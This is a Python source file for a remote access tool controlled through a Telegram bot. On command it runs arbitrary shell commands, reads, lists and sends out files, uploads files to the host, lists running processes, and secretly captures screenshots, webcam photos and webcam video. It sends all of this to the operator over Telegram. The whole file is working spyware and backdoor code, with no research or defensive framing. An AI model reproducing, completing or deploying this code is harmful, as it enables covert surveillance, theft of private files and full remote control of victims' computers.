import cv2
import os
import time
import telebot
import platform
import pyautogui
import subprocess


BOT_API_KEY = "BOT TOKEN"
telegram_user_id = "CHAT ID IN INTEGER FORMAT"

bot = telebot.TeleBot(BOT_API_KEY)

def verify_telegram_id(id):
    return telegram_user_id == id

def execute_system_command(cmd):
    max_message_length = 2048
    output = subprocess.getstatusoutput(cmd)

    if len(output[1]) > max_message_length:
        return str(output[1][:max_message_length])
    
    return str(output[1])


@bot.message_handler(commands=['start'])
def begin(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    hostname = execute_system_command("hostname")
    current_user = execute_system_command("whoami")
    response = f"Running as: {hostname}/{current_user}"
    bot.reply_to(message, response)


@bot.message_handler(commands=['viewFile'])
def view_file(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if len(message.text.split(' ')) != 2:
        return 
    
    file_path = message.text.split(' ')[1]
    result = ""
    if platform.system() == "Windows":
        result = execute_system_command(f"type {file_path}")
    else:
        result = execute_system_command(f"cat {file_path}")

    bot.reply_to(message, result)


@bot.message_handler(commands=['listDir'])
def list_directory(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if len(message.text.split(' ')) != 2:
        return 
    
    file_path = message.text.split(' ')[1]
    result = ""
    if platform.system() == "Windows":
        result = execute_system_command(f"dir {file_path}")
    else:
        result = execute_system_command(f"ls -lah {file_path}")

    bot.reply_to(message, result)


@bot.message_handler(commands=['downloadFile'])
def download_file(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if len(message.text.split(' ')) != 2:
        return 
    
    file_path = message.text.split(' ')[1]
    try:
        with open(file_path, "rb") as file:
            bot.send_document(message.from_user.id, file)
            bot.reply_to(message, "[+] File downloaded")
    except:
        bot.reply_to(message, "[!] Unsuccessful")


@bot.message_handler(commands=['services'])
def running_services(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    result = ""
    if platform.system() == "Windows":
        result = execute_system_command("tasklist")
    else:
        result = execute_system_command("ps aux")

    bot.reply_to(message, result)

@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        screenshot = pyautogui.screenshot()

        # Save screenshot using current timestamp
        timestamp = int(time.time())
        screenshot.save(f"{timestamp}.png")
        with open(f"{timestamp}.png", "rb") as image:
            bot.send_photo(message.from_user.id, image)

        bot.reply_to(message, "[+] Image downloaded")
    except:
        bot.reply_to(message, "[!] Unsuccessful")


@bot.message_handler(commands=['webcam'])
def webcam(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        cap = cv2.VideoCapture(0)

        ret, frame = cap.read()
        if ret:
            
            timestamp = int(time.time())
            cv2.imwrite(f"{timestamp}.png", frame)
            
            with open(f"{timestamp}.png", "rb") as image:
                bot.send_photo(message.from_user.id, image)

            cap.release()
    except:
        bot.reply_to(message, "[!] Unsuccessful")


@bot.message_handler(commands=['video'])
def record_video(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if len(message.text.split(' ')) != 2:
        return 
    
    try:
        
        duration = int(message.text.split(' ')[1])

        cap = cv2.VideoCapture(0)
        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        timestamp = int(time.time())
        out = cv2.VideoWriter(f"{timestamp}.avi", fourcc, 20.0, (640, 480))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                break

            out.write(frame)

        
        out.release()
        cap.release()

        
        with open(f"{timestamp}.avi", "rb") as video:
            bot.send_video(message.from_user.id, video)
    except:
        bot.reply_to(message, "[!] Unsuccessful")       


@bot.message_handler(content_types=['document'])
def handle_document_upload(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        if message.document:
            
            file_id = message.document.file_id
            file_name = message.document.file_name

            
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            with open(f"./{file_name}", "wb") as file:
                file.write(downloaded_file)

            bot.reply_to(message, "[+] Upload successful")
    except:
        bot.reply_to(message, "[!] Unsuccessful")


@bot.message_handler()
def handle_any_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    if message.text.startswith("/start"):
        return
    
    response = execute_system_command(message.text)
    bot.reply_to(message, response)


@bot.message_handler(commands=['command_blind'])
def exec_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        os.system(message.text)
        bot.reply_to(message, "[*] Success, wait.")
    except:
        bot.reply_to(message, "[!] Unsuccessful")


bot.infinity_polling()
